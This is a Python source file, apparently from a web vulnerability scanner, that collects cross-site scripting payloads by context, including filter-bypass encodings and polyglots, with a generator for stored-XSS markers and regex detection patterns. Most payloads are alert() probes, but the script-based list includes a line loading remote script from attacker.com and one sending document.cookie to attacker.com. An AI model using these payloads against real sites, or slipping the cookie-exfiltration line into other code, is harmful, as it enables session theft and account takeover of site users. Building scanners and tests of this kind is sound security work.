"""
XSS (Cross-Site Scripting) Payloads Collection
Includes various XSS payloads for testing Reflected and Stored XSS
"""

import uuid

class XSSPayloads:
    """Collection of XSS payloads"""
    
    # Basic XSS payloads
    BASIC_XSS = [
        "<script>alert('XSS')</script>",
        "<script>alert(1)</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(document.cookie)</script>",
        "<img src=x onerror=alert('XSS')>",
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert('XSS')>",
        "<svg onload=alert(1)>",
        "<body onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "<input type='text' onfocus=alert('XSS') autofocus>",
        "<marquee onstart=alert('XSS')>",
        "<details open ontoggle=alert('XSS')>",
    ]
    
    # Event handler-based XSS
    EVENT_HANDLER_XSS = [
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        "<body onload=alert(1)>",
        "<input onfocus=alert(1) autofocus>",
        "<select onfocus=alert(1) autofocus>",
        "<textarea onfocus=alert(1) autofocus>",
        "<keygen onfocus=alert(1) autofocus>",
        "<video onerror=alert(1)><source>",
        "<audio onerror=alert(1)><source>",
        "<details ontoggle=alert(1) open>",
        "<marquee onstart=alert(1)>",
        "<div onmouseover=alert(1)>test</div>",
        "<span onmouseover=alert(1)>test</span>",
    ]
    
    # Script-based XSS
    SCRIPT_BASED_XSS = [
        "<script>alert(1)</script>",
        "<script>alert(String.fromCharCode(88,83,83))</script>",
        "<script>alert(document.domain)</script>",
        "<script>alert(window.origin)</script>",
        "<script src='http://attacker.com/evil.js'></script>",
        "<script>eval(atob('YWxlcnQoMSk='))</script>",
        "<script>fetch('http://attacker.com?cookie='+document.cookie)</script>",
    ]
    
    # Filter bypass payloads
    BYPASS_XSS = [
        # Case variation
        "<ScRiPt>alert(1)</sCrIpT>",
        "<IMG SRC=x ONERROR=alert(1)>",
        
        # Encoding
        "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;</script>",
        "<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>",
        
        # Without quotes
        "<img src=x onerror=alert(1)>",
        "<svg onload=alert(1)>",
        
        # Without spaces
        "<img/src=x/onerror=alert(1)>",
        "<svg/onload=alert(1)>",
        
        # Nested tags
        "<<script>alert(1)</script>",
        "<scr<script>ipt>alert(1)</scr</script>ipt>",
        
        # Alternative tags
        "<img src=1 onerror=alert(1)>",
        "<iframe src=javascript:alert(1)>",
        "<embed src=javascript:alert(1)>",
        "<object data=javascript:alert(1)>",
        
        # Using different brackets
        "<svg><script>alert(1)</script></svg>",
        "<math><script>alert(1)</script></math>",
        
        # URL encoded
        "%3Cscript%3Ealert(1)%3C/script%3E",
        "%3Cimg%20src=x%20onerror=alert(1)%3E",
        
        # Double encoding
        "%253Cscript%253Ealert(1)%253C/script%253E",
        
        # Unicode encoding
        "\u003Cscript\u003Ealert(1)\u003C/script\u003E",
    ]
    
    # Context-specific payloads
    ATTRIBUTE_XSS = [
        "' onclick='alert(1)",
        "\" onclick=\"alert(1)",
        "' onfocus='alert(1)' autofocus='",
        "\" onfocus=\"alert(1)\" autofocus=\"",
        "' onmouseover='alert(1)",
        "\" onmouseover=\"alert(1)",
    ]
    
    # JavaScript context payloads
    JS_CONTEXT_XSS = [
        "';alert(1);//",
        "\";alert(1);//",
        "';alert(String.fromCharCode(88,83,83));//",
        "</script><script>alert(1)</script>",
    ]
    
    # HTML context payloads
    HTML_CONTEXT_XSS = [
        "<img src=x onerror=alert(1)>",
        "</textarea><script>alert(1)</script>",
        "</title><script>alert(1)</script>",
        "</style><script>alert(1)</script>",
    ]
    
    # Polyglot payloads (work in multiple contexts)
    POLYGLOT_XSS = [
        "javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/\"/+/onmouseover=1/+/[*/[]/+alert(1)//'>",
        "'\"><img src=x onerror=alert(1)>",
        "'><script>alert(1)</script>",
        "\"><script>alert(1)</script>",
    ]
    
    @classmethod
    def get_all_payloads(cls):
        """Get all XSS payloads"""
        return (
            cls.BASIC_XSS +
            cls.EVENT_HANDLER_XSS +
            cls.SCRIPT_BASED_XSS +
            cls.BYPASS_XSS +
            cls.ATTRIBUTE_XSS +
            cls.JS_CONTEXT_XSS +
            cls.HTML_CONTEXT_XSS +
            cls.POLYGLOT_XSS
        )
    
    @classmethod
    def get_basic_payloads(cls):
        """Get basic XSS payloads for quick scan"""
        return cls.BASIC_XSS + cls.EVENT_HANDLER_XSS[:5]
    
    @classmethod
    def generate_unique_payload(cls, payload_type="basic"):
        """Generate unique payload with identifier for Stored XSS detection"""
        unique_id = str(uuid.uuid4())[:8]
        
        if payload_type == "basic":
            return f"<script>alert('XSS-{unique_id}')</script>", unique_id
        elif payload_type == "img":
            return f"<img src=x onerror=alert('XSS-{unique_id}')>", unique_id
        elif payload_type == "svg":
            return f"<svg onload=alert('XSS-{unique_id}')>", unique_id
        else:
            return f"<script>alert('{unique_id}')</script>", unique_id
    
    # XSS detection patterns in response
    XSS_DETECTION_PATTERNS = [
        r"<script[^>]*>.*?alert.*?</script>",
        r"<img[^>]*onerror[^>]*>",
        r"<svg[^>]*onload[^>]*>",
        r"<iframe[^>]*src[^>]*javascript:",
        r"<body[^>]*onload[^>]*>",
        r"<input[^>]*onfocus[^>]*>",
        r"<[^>]*on\w+=[^>]*alert",
        r"javascript:alert",
        r"onerror=alert",
        r"onload=alert",
        r"onfocus=alert",
    ]
